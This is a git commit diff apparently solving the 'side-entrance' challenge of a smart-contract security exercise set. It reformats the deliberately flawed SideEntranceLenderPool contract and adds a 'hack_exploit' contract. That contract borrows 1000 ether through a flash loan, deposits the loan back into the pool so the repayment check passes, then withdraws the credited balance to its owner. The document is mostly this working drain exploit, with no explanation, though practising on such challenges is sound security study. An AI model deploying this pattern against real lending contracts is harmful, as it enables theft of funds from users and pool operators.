52014f91a24ad69ae7d4df4b9544cc999d5cc566
Harish <s.sriramula1998@gmail.com>
2022-08-07 13:56:28 +0530

    side-entrance challenge completed

--- contracts/side-entrance/SideEntranceLenderPool.sol
+++ contracts/side-entrance/SideEntranceLenderPool.sol
@@ -14,7 +14,7 @@ interface IFlashLoanEtherReceiver {
 contract SideEntranceLenderPool {
     using Address for address payable;
 
-    mapping (address => uint256) private balances;
+    mapping(address => uint256) private balances;
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
@@ -29,10 +29,41 @@ contract SideEntranceLenderPool {
     function flashLoan(uint256 amount) external {
         uint256 balanceBefore = address(this).balance;
         require(balanceBefore >= amount, "Not enough ETH in balance");
-        
+
         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
 
-        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
+        require(
+            address(this).balance >= balanceBefore,
+            "Flash loan hasn't been paid back"
+        );
     }
 }
- 
+
+contract hack_exploit {
+    SideEntranceLenderPool private immutable pool;
+    uint256 private constant amount = 1000 ether;
+    address payable immutable owner;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+        owner = payable(msg.sender);
+    }
+
+    function attack() public {
+        pool.flashLoan(amount);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function withdraw() public payable {
+        pool.withdraw();
+        (bool succ, ) = owner.call{value: address(this).balance}("");
+        require(succ, "Withdraw failed");
+    }
+
+    receive() external payable {}
+
+    fallback() external payable {}
+}
